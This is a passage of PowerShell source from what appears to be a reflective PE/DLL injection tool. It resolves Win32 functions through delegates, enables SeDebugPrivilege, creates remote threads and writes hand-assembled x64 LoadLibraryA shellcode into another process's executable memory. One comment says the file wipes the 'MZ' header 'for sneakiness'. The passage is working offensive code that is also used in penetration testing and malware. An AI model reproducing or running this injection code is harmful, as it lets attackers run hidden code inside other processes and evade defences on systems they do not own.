		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
	
		$LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$LocalFreeDelegate = Get-DelegateType @([IntPtr])
		$LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree

		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
		[IntPtr]
		$EndAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
		[IntPtr]$FinalEndAddress = [IntPtr]::Zero
		if ($PsCmdlet.ParameterSetName -eq "Size")
		{
			[IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		}
		else
		{
			$FinalEndAddress = $EndAddress
		}
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Invoke-CreateRemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Verbose "Error creating remote thread, thread handle is null"
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
